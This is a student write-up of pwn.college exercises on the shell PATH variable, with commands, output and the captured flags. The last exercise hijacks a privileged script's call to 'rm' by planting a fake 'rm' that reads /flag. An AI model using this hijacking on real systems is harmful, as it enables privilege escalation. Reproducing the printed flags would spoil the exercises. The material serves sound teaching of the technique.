# Pondering PATH

### The PATH Variable
```
hacker@path~the-path-variable:~$ PATH=" "
hacker@path~the-path-variable:~$ /challenge/run
Trying to remove /flag...
/challenge/run: line 4: rm: command not found
The flag is still there! I might as well give it to you!
pwn.college{0FcBaNuRstPswR91S53NAd6jDmE.dZzNwUDLzMTN2czW}
```
PATH is a special shell variable that stores a bunch of directory paths in which the shell will search for programs corresponding to commands.

Set the value of Path to " " so that ```/challenge/run``` will not be able to find ```rm``` command, thus preventing deletion of the flag file, to get the flag **pwn.college{0FcBaNuRstPswR91S53NAd6jDmE.dZzNwUDLzMTN2czW}**.

### Setting PATH
```
hacker@path~setting-path:~$ PATH="/challenge/more_commands/"
hacker@path~setting-path:~$ /challenge/run
Invoking 'win'....
Congratulations! You properly set the flag and 'win' has launched!
pwn.college{wirVDWLbT_Xxt0vXSfPI8kb6YhA.dVzNyUDLzMTN2czW}
```
Set the value of Path to "/challenge/more_commands/" so that ```/challenge/run``` will be able to find ```win``` command via its name, to get the flag **pwn.college{wirVDWLbT_Xxt0vXSfPI8kb6YhA.dVzNyUDLzMTN2czW}**.

### Adding Commands
```
hacker@variables~printing-variables:~$ find / -name cat
find: ‘/root’: Permission denied
find: ‘/etc/ssl/private’: Permission denied
find: ‘/tmp/tmp.G9qthVCks5’: Permission denied
/usr/bin/cat
^C
hacker@variables~printing-variables:~$ touch win
hacker@variables~printing-variables:~$ echo "/usr/bin/cat /flag" > win
hacker@variables~printing-variables:~$ ls -l win
-rw-r--r-- 1 hacker hacker 19 Oct 23 09:16 win
hacker@variables~printing-variables:~$ chmod +x win
hacker@variables~printing-variables:~$ PATH="/home/hacker"
hacker@path~adding-commands:~$ /challenge/run
Invoking 'win'....
pwn.college{o6KFnTlvV6t0ZZEt9XYECYLLJwI.dZzNyUDLzMTN2czW}
```
Used ```find / -name``` command to find absolute path of cat; this is necessary as a later step was to set PATH to "/home/hacker" so as to make ```win``` accessible to ```/challenge/run```, however changing PATH value makes cat inaccessible via just its name. 

Created ```win```, redirected "/usr/bin/cat /flag" into it, and changed its permissions so as to make it executable by all using ```chmod +x``` and ran ```/challenge/run``` after changing PATH to get the flag **pwn.college{o6KFnTlvV6t0ZZEt9XYECYLLJwI.dZzNyUDLzMTN2czW}**.

### Hijacking Commands
```
hacker@path~hijacking-commands:~$ touch getflag
hacker@path~hijacking-commands:~$ echo "/bin/cat /flag" > getflag
hacker@path~hijacking-commands:~$ chmod +x getflag
hacker@path~hijacking-commands:~$ PATH="/home/hacker"
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
/challenge/run: line 7: rm: command not found
hacker@path~hijacking-commands:~$ /bin/mv getflag rm
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{IMe8YrLHvWmEFBCdGzmmEAFoC2b.ddzNyUDLzMTN2czW}
```
Created ```getflag```, redirected "/bin/cat /flag" into it, and changed its permissions so as to make it executable by all using ```chmod +x``` and ran ```/challenge/run``` after changing PATH to "/home/hacker".

However, I realised that I should've named ```getflag``` as ```rm``` so that ```/challenge/run``` would run my command, because an ```rm``` named command is already being invoked in its script.

I then used ```mv``` to rename ```getflag``` to ```rm``` and finally got the flag **pwn.college{IMe8YrLHvWmEFBCdGzmmEAFoC2b.ddzNyUDLzMTN2czW}**.
___